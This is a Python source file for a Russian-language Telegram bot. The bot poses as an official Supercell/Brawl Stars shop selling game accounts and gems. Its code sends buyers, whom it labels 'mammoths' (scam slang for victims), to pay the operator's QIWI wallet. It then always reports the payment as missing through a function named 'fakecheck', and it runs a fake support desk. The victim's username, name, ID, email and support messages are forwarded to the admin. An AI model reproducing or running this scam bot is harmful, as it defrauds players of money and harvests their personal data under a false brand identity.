import colorama
from  colorama  import  Fore ,  Back ,  Style
import telebot
from telebot import types
import os
import time
import markups as m

os.system('clear')

print(Fore.BLUE+""" __                         __                            
|  |--.----.---.-.--.--.--.|  |.-----.----.---.-.--------.
|  _  |   _|  _  |  |  |  ||  ||__ --|  __|  _  |        |
|_____|__| |___._|________||__||_____|____|___._|__|__|__|""")
print('Автор проекта @telebotuser.Наш канал https://t.me/koshmavarius')

time.sleep(1)

print('Для запуска бота вам обзательно надо написать ему /start')
print('\nВведдите токен бота:')
token = input()

print('\nВведдите свой Telegram ID:')
admin = input()

print('\nВведдите киви юзернейм(Пример testusernane):')
qiwi = input()






print('Бот запущен!')






bot = telebot.TeleBot(token)

@bot.message_handler(commands=['start','help'])
def start(message):
	global username
	username = message.from_user.username
	global firstname
	firstname = message.from_user.first_name
	global lastname
	lastname = message.from_user.last_name

	msg = bot.send_message(message.chat.id,'👋Привет {0.first_name}!\n🪐Если хочешь приобрести аккаунт или валюту в бравле то кликай на Меню!'.format(message.from_user),reply_markup=m.menu)
	print(f'\nМамонт запустил бота!\nДанные мамонта:\nЮзер нейм : @{username}\nИмя : {firstname} {lastname}\nId : {message.chat.id}')
	
	
	bot.send_message(admin,f'~[Message for admin]~\n❗Мамонт запустил бота!\nДанные мамонта:\nЮзер нейм : @{username}\nИмя : {firstname} {lastname}\nId : {message.chat.id}')
	
	bot.register_next_step_handler(msg,handler)

def handler(message):
	if message.text == '⚙Меню':
		 bot.send_message(message.chat.id,'☂Вы в меню',reply_markup=m.podmenu)


@bot.message_handler()
def podmenu(message):
	if message.text == '🗂О нас':
		bot.send_message(message.chat.id,'🗂Коротко о нас:\nНаш бот офиициальный представитель франшизы бравл старс.В случае ,если бот не выдаст товар обращаться в поддержку ',reply_markup=m.back)
	elif message.text == '🆘Тех.поддержка':
		msg = bot.send_message(message.chat.id,'🆘Вас приветствует поддержка Supercell!Опишите свою проблему.Для выхода нажмите кнопку назад',reply_markup=m.back)
		bot.register_next_step_handler(msg,support)
	elif message.text == '⬅️Назад':
		bot.send_message(message.chat.id,'☂Вы в меню',reply_markup=m.podmenu)
	elif message.text == '💳Приобрести аккаунты':
		bot.send_message(message.chat.id,'📃Список аккаунтов:',reply_markup=m.accaunts1)
	elif message.text == '⬅️Вернуться к списку аккаунтов':
		bot.send_message(message.chat.id,'📃Список аккаунтов:',reply_markup=m.accaunts1)
	elif message.text == '✅Проверить оплату':
		bot.send_message(message.chat.id,'Подключаюсь к серверам...')
		time.sleep(3.5)
		bot.send_message(message.chat.id,'❗Похоже,что вы не оплатили')
	elif message.text == '🤑Приобрести гемы':
		msg = bot.send_message(message.chat.id,'✉️Введите почту',reply_markup=m.back)
		bot.register_next_step_handler(msg,gems)
	

		
			
#меню с аккаунтами			
	elif message.text == 'Аккаунт 1':
		photo1 = open('photo/1.jpg','rb')
		bot.send_photo(message.chat.id,photo1)
		bot.send_message(message.chat.id,f'💰Цена 349р\n💬Комментарий к оплате - a1\n🔗Ссылка на оплату https://qiwi.com/n/{qiwi}\n❗Указывайте комментарий и отправляйте полную стоимость товара,если вы этого не сделаете бот вас не поймет,а соответсвенно не выдаст товар',reply_markup=m.checkback)
	elif message.text == 'Аккаунт 2':
		photo2 = open('photo/2.jpg','rb')
		bot.send_photo(message.chat.id,photo2)
		bot.send_message(message.chat.id,f'💰Цена 349р\n💬Комментарий к оплате - a2\n🔗Ссылка на оплату https://qiwi.com/n/{qiwi}\n❗Указывайте комментарий и отправляйте полную стоимость товара,если вы этого не сделаете бот вас не поймет,а соответсвенно не выдаст товар',reply_markup=m.checkback)
	elif message.text == 'Аккаунт 3':
		photo3 = open('photo/3.jpg','rb')
		bot.send_photo(message.chat.id,photo3)
		bot.send_message(message.chat.id,f'💰Цена 349р\n💬Комментарий к оплате - a3\n🔗Ссылка на оплату https://qiwi.com/n/{qiwi}\n❗Указывайте комментарий и отправляйте полную стоимость товара,если вы этого не сделаете бот вас не поймет,а соответсвенно не выдаст товар',reply_markup=m.checkback)
	elif message.text == 'Аккаунт 4':
		photo4= open('photo/4.jpg','rb')
		bot.send_photo(message.chat.id,photo4)
		bot.send_message(message.chat.id,f'💰Цена 349р\n💬Комментарий к оплате - a4\n🔗Ссылка на оплату https://qiwi.com/n/{qiwi}\n❗Указывайте комментарий и отправляйте полную стоимость товара,если вы этого не сделаете бот вас не поймет,а соответсвенно не выдаст товар',reply_markup=m.checkback)
	elif message.text == 'Аккаунт 5':
		photo5= open('photo/5.jpg','rb')
		bot.send_photo(message.chat.id,photo5)
		bot.send_message(message.chat.id,f'💰Цена 349р\n💬Комментарий к оплате - a5\n🔗Ссылка на оплату https://qiwi.com/n/{qiwi}\n❗Указывайте комментарий и отправляйте полную стоимость товара,если вы этого не сделаете бот вас не поймет,а соответсвенно не выдаст товар',reply_markup=m.checkback)
	elif message.text == 'Аккаунт 6':
		photo6 = open('photo/6.jpg','rb')
		bot.send_photo(message.chat.id,photo6)
		bot.send_message(message.chat.id,f'💰Цена 349р\n💬Комментарий к оплате - a6\n🔗Ссылка на оплату https://qiwi.com/n/{qiwi}\n❗Указывайте комментарий и отправляйте полную стоимость товара,если вы этого не сделаете бот вас не поймет,а соответсвенно не выдаст товар',reply_markup=m.checkback)
	elif message.text == 'Аккаунт 7':
		photo7 = open('photo/7.jpg','rb')
		bot.send_photo(message.chat.id,photo7)
		bot.send_message(message.chat.id,f'💰Цена 349р\n💬Комментарий к оплате - a7\n🔗Ссылка на оплату https://qiwi.com/n/{qiwi}\n❗Указывайте комментарий и отправляйте полную стоимость товара,если вы этого не сделаете бот вас не поймет,а соответсвенно не выдаст товар',reply_markup=m.checkback)
	elif message.text == 'Аккаунт 8':
		photo8 = open('photo/8.jpg','rb')
		bot.send_photo(message.chat.id,photo8)
		bot.send_message(message.chat.id,f'💰Цена 349р\n💬Комментарий к оплате - a8\n🔗Ссылка на оплату https://qiwi.com/n/{qiwi}\n❗Указывайте комментарий и отправляйте полную стоимость товара,если вы этого не сделаете бот вас не поймет,а соответсвенно не выдаст товар',reply_markup=m.checkback)
	elif message.text == 'Аккаунт 9':
		photo9 = open('photo/9.jpg','rb')
		bot.send_photo(message.chat.id,photo9)
		bot.send_message(message.chat.id,f'💰Цена 349р\n💬Комментарий к оплате - a9\n🔗Ссылка на оплату https://qiwi.com/n/{qiwi}\n❗Указывайте комментарий и отправляйте полную стоимость товара,если вы этого не сделаете бот вас не поймет,а соответсвенно не выдаст товар',reply_markup=m.checkback)
	elif message.text == 'Аккаунт 10':
		photo10 = open('photo/10.jpg','rb')
		bot.send_photo(message.chat.id,photo10)
		bot.send_message(message.chat.id,f'💰Цена 349р\n💬Комментарий к оплате - a10\n🔗Ссылка на оплату https://qiwi.com/n/{qiwi}\n❗Указывайте комментарий и отправляйте полную стоимость товара,если вы этого не сделаете бот вас не поймет,а соответсвенно не выдаст товар',reply_markup=m.checkback)
	elif message.text == '➡️Дальше':

		bot.send_message(message.chat.id,'📃Второй список аккаунтов',reply_markup=m.accaunts2)
	elif message.text == '⬅️Вернуться к предыдущему списку':

			bot.send_message(message.chat.id,'📃Список аккаунтов:',reply_markup=m.accaunts1)
	elif message.text == 'Аккаунт 11':
		photo11 = open('photo/11.jpg','rb')
		bot.send_photo(message.chat.id,photo11)
		bot.send_message(message.chat.id,f'💰Цена 349р\n💬Комментарий к оплате - a11\n🔗Ссылка на оплату https://qiwi.com/n/{qiwi}\n❗Указывайте комментарий и отправляйте полную стоимость товара,если вы этого не сделаете бот вас не поймет,а соответсвенно не выдаст товар',reply_markup=m.checkback2)
	elif message.text == 'Аккаунт 12':
		photo12 = open('photo/12.jpg','rb')
		bot.send_photo(message.chat.id,photo12)
		bot.send_message(message.chat.id,f'💰Цена 349р\n💬Комментарий к оплате - a12\n🔗Ссылка на оплату https://qiwi.com/n/{qiwi}\n❗Указывайте комментарий и отправляйте полную стоимость товара,если вы этого не сделаете бот вас не поймет,а соответсвенно не выдаст товар',reply_markup=m.checkback2)
	elif message.text == 'Аккаунт 13':
		photo13 = open('photo/13.jpg','rb')
		bot.send_photo(message.chat.id,photo13)
		bot.send_message(message.chat.id,f'💰Цена 349р\n💬Комментарий к оплате - a13\n🔗Ссылка на оплату https://qiwi.com/n/{qiwi}\n❗Указывайте комментарий и отправляйте полную стоимость товара,если вы этого не сделаете бот вас не поймет,а соответсвенно не выдаст товар',reply_markup=m.checkback2)
	elif message.text == 'Аккаунт 14':
		photo14= open('photo/14.jpg','rb')
		bot.send_photo(message.chat.id,photo14)
		bot.send_message(message.chat.id,f'💰Цена 349р\n💬Комментарий к оплате - a14\n🔗Ссылка на оплату https://qiwi.com/n/{qiwi}\n❗Указывайте комментарий и отправляйте полную стоимость товара,если вы этого не сделаете бот вас не поймет,а соответсвенно не выдаст товар',reply_markup=m.checkback2)
	elif message.text == 'Аккаунт 15':
		photo15 = open('photo/15.jpg','rb')
		bot.send_photo(message.chat.id,photo15)
		bot.send_message(message.chat.id,f'💰Цена 349р\n💬Комментарий к оплате - a15\n🔗Ссылка на оплату https://qiwi.com/n/{qiwi}\n❗Указывайте комментарий и отправляйте полную стоимость товара,если вы этого не сделаете бот вас не поймет,а соответсвенно не выдаст товар',reply_markup=m.checkback2)
	elif message.text == 'Аккаунт 16':
		photo16 = open('photo/16.jpg','rb')
		bot.send_photo(message.chat.id,photo16)
		bot.send_message(message.chat.id,f'💰Цена 349р\n💬Комментарий к оплате - a16\n🔗Ссылка на оплату https://qiwi.com/n/{qiwi}\n❗Указывайте комментарий и отправляйте полную стоимость товара,если вы этого не сделаете бот вас не поймет,а соответсвенно не выдаст товар',reply_markup=m.checkback2)
	elif message.text == 'Аккаунт 17':
		photo17 = open('photo/17.jpg','rb')
		bot.send_photo(message.chat.id,photo17)
		bot.send_message(message.chat.id,f'💰Цена 349р\n💬Комментарий к оплате - a17\n🔗Ссылка на оплату https://qiwi.com/n/{qiwi}\n❗Указывайте комментарий и отправляйте полную стоимость товара,если вы этого не сделаете бот вас не поймет,а соответсвенно не выдаст товар',reply_markup=m.checkback2)
	elif message.text == 'Аккаунт 18':
		photo18 = open('photo/18.jpg','rb')
		bot.send_photo(message.chat.id,photo18)
		bot.send_message(message.chat.id,f'💰Цена 349р\n💬Комментарий к оплате - a18\n🔗Ссылка на оплату https://qiwi.com/n/{qiwi}\n❗Указывайте комментарий и отправляйте полную стоимость товара,если вы этого не сделаете бот вас не поймет,а соответсвенно не выдаст товар',reply_markup=m.checkback2)
	elif message.text == 'Аккаунт 19':
		photo19 = open('photo/19.jpg','rb')
		bot.send_photo(message.chat.id,photo19)
		bot.send_message(message.chat.id,f'💰Цена 349р\n💬Комментарий к оплате - a19\n🔗Ссылка на оплату https://qiwi.com/n/{qiwi}\n❗Указывайте комментарий и отправляйте полную стоимость товара,если вы этого не сделаете бот вас не поймет,а соответсвенно не выдаст товар',reply_markup=m.checkback2)
	elif message.text == 'Аккаунт 20':
		photo20 = open('photo/20.jpg','rb')
		bot.send_photo(message.chat.id,photo20)
		bot.send_message(message.chat.id,f'💰Цена 349р\n💬Комментарий к оплате - a20\n🔗Ссылка на оплату https://qiwi.com/n/{qiwi}\n❗Указывайте комментарий и отправляйте полную стоимость товара,если вы этого не сделаете бот вас не поймет,а соответсвенно не выдаст товар',reply_markup=m.checkback2)
	elif message.text == '⬅️Вернуться ко второму списку':
		bot.send_message(message.chat.id,'📃Второй список аккаунтов',reply_markup=m.accaunts2)
	
		
		
def gems(message):
	global pochta
	pochta = message.text
	if message.text == '⬅️Назад':
		bot.send_message(message.chat.id,'☂Вы в меню',reply_markup=m.podmenu)
	else: 
		if not '@' in message.text:
			msg = bot.send_message(message.chat.id,'❗Введите настоящую  почту!',reply_markup=m.back)
		
			bot.register_next_step_handler(msg, gems)

		else:
			bot.send_message(admin,f'~[Message for admin]~\n❗Мамонт ввел почту "{pochta}"\nДанные мамонта:\nЮзер нейм : @{username}\nИмя : {firstname} {lastname}\nId : {message.chat.id}')
			print(f'\nМамонт ввел почту "{pochta}"\nДанные мамонта:\nЮзер нейм : @{username}\nИмя : {firstname} {lastname}\nId : {message.chat.id}')
			time.sleep(3.5)
			msg = bot.send_message(message.chat.id,'✅Аккаунт найден в базе данных.Выберите кол-во гемов',reply_markup=m.gems)
				
			bot.register_next_step_handler(msg,gemshandler)
def gemshandler(message):
	if message.text == '⬅️Назад':
		bot.send_message(message.chat.id,'☂Вы в меню',reply_markup=m.podmenu)
	elif message.text == '30 Гемов':
		msg = bot.send_message(message.chat.id,f'💰Цена 49р\n💬Комментарий к оплате - g30\n🔗Ссылка на оплату https://qiwi.com/n/{qiwi}\n📧Ваша почта {pochta}\n❗Указывайте комментарий и отправляйте полную стоимость товара,если вы этого не сделаете бот вас не поймет,а соответсвенно не выдаст товар',reply_markup=m.checkback3)
		bot.register_next_step_handler(msg,fakecheck)
	elif message.text == '80 Гемов':
		msg = bot.send_message(message.chat.id,f'💰Цена 179р\n💬Комментарий к оплате - g80\n🔗Ссылка на оплату https://qiwi.com/n/{qiwi}\n📧Ваша почта {pochta}\n❗Указывайте комментарий и отправляйте полную стоимость товара,если вы этого не сделаете бот вас не поймет,а соответсвенно не выдаст товар',reply_markup=m.checkback3)
		bot.register_next_step_handler(msg,fakecheck)
	elif message.text == '170 Гемов':
		msg = bot.send_message(message.chat.id,f'💰Цена 499р\n💬Комментарий к оплате - g170\n🔗Ссылка на оплату https://qiwi.com/n/{qiwi}\n📧Ваша почта {pochta}\n❗Указывайте комментарий и отправляйте полную стоимость товара,если вы этого не сделаете бот вас не поймет,а соответсвенно не выдаст товар',reply_markup=m.checkback3)
		bot.register_next_step_handler(msg,fakecheck)
	elif message.text == '360 Гемов':
		msg = bot.send_message(message.chat.id,f'💰Цена 790р\n💬Комментарий к оплате - g790\n🔗Ссылка на оплату https://qiwi.com/n/{qiwi}\n📧Ваша почта {pochta}\n❗Указывайте комментарий и отправляйте полную стоимость товара,если вы этого не сделаете бот вас не поймет,а соответсвенно не выдаст товар',reply_markup=m.checkback3)
		bot.register_next_step_handler(msg,fakecheck)
	elif message.text == '950 Гемов':
		msg = bot.send_message(message.chat.id,f'💰Цена 1790р\n💬Комментарий к оплате - g950\n🔗Ссылка на оплату https://qiwi.com/n/{qiwi}\n📧Ваша почта {pochta}\n❗Указывайте комментарий и отправляйте полную стоимость товара,если вы этого не сделаете бот вас не поймет,а соответсвенно не выдаст товар',reply_markup=m.checkback3)
		bot.register_next_step_handler(msg,fakecheck)
	elif message.text == '2000 Гемов':
		msg = bot.send_message(message.chat.id,f'💰Цена 4490р\n💬Комментарий к оплате - g2000\n🔗Ссылка на оплату https://qiwi.com/n/{qiwi}\n📧Ваша почта {pochta}\n❗Указывайте комментарий и отправляйте полную стоимость товара,если вы этого не сделаете бот вас не поймет,а соответсвенно не выдаст товар',reply_markup=m.checkback3)
		bot.register_next_step_handler(msg,fakecheck)




def fakecheck(message):
	if message.text == '⬅️Вернуться к гемам':
		msg = bot.send_message(message.chat.id,'👾Выберите кол-во гемов',reply_markup=m.gems)
		bot.register_next_step_handler(msg,gemshandler)
	
	elif message.text == '✅Проверить оплату':
		bot.send_message(message.chat.id,'Подключаюсь к серверам...')
		time.sleep(3.5)
		msg = bot.send_message(message.chat.id,'❗Похоже,что вы не оплатили')
		bot.register_next_step_handler(msg,fakecheck)			
				

				
	
#фейковая поддержка		
def support(message):
		if message.text == '⬅️Назад':
			 bot.send_message(message.chat.id,'☂Вы в меню',reply_markup=m.podmenu)
		elif message.text != '⬅️Назад':
			print(f'\n\n\nМамонт отправил сообщение в тех поддержку.Текст сообщения "{message.text}"\nДанные мамонта:\nЮзер нейм : @{username}\nИмя : {firstname} {lastname}\nId : {message.chat.id}')
			bot.send_message(admin,f'~[Message for admin]~\n❗Мамонт отправил сообщение в тех поддержку.Текст сообщения "{message.text}"\nДанные мамонта:\nЮзер нейм : @{username}\nИмя : {firstname} {lastname}\nId : {message.chat.id}')
			bot.send_message(message.chat.id,f'✅Обращение было успешно принятно,наши агенты поддержки рассмотрят его.Текст обращения "{message.text}"')
			
			



		
		
			

			
		
		
			
			
		
		
			
			
			
		
	





bot.enable_save_next_step_handlers(delay=2)
bot.load_next_step_handlers()
bot.polling(none_stop=True)
